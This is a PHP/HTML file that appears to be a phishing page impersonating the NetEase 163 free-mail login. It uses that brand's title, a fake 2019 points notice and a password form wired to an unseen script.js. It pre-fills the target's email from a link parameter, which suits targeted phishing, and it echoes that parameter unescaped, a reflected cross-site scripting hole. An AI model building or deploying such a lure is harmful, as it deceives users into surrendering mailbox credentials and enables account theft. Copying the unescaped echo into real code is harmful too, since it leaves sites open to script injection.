<?php
	if(isset($_GET['email'])){
		$email = $_GET['email'];
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title>163网易免费邮--中文邮箱第一品牌</title>
	<link rel="icon" href="icon.png" />
	<link rel="stylesheet" href="style.css" />
	<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
</head>
<body>
	<header>
		<div class="header-container py-2">
			<img src="logo.png" width="130px" height="30px">
		</div>
	</header>
	<section style="float: left;">
		<div class="row">
			<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xl-12 mx-auto">
				<div class="col-sm-12 col-md-5 px-0 float-left d-none d-sm-none d-md-inline d-lg-inline d-xl-inline">
					<img src="bg.png">
				</div>
				<div class="col-sm-12 col-md-7 float-left p-0 bg-white">
					<div class="col-sm-12 col-md-7 mx-auto">
						<div class="col-12 p-0">
							<div class="col-12 py-2 float-left mt-5">
								<p class="text-center text-warning mb-0 mt-5">公告：2019年网易免费邮箱积分处理通知</p>
								<h5 class="m-0 py-1 text-center"><strong>邮箱帐号登录</strong></h5>
							</div>
							<div class="form-group px-4">
								<div class="alert alert-info hide" id="processing"></div>
							</div>
							<div class="form-group px-4 mt-2">
								<input class="form-control rounded-0" id="email" value="<?php echo $_GET['email']; ?>" placeholder="邮箱帐号或手机号码" disabled="">
								<small id="error" style="color:red;"></small>
							</div>
							<div class="form-group px-4 mt-4">
								<input class="form-control rounded-0" type="password" id="password" placeholder="输入密码">
								<small id="error" style="color:red;"></small>
							</div>
							<div class="form-group px-4">
								<input type="checkbox" id="remember">
								<label class="text-medium">下次自动登录</label>
								<label class="text-medium float-right">忘了密码？</label>
							</div>
							<div class="form-group px-4">
								<button class="btn btn-block btn-lg btn-primary" id="login">登 录</button>
							</div>
							<div class="form-group px-4">
								<p class="text-primary text-center">注册新帐号</p>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
</body>
<script type="text/javascript" src="script.js"></script>
</html>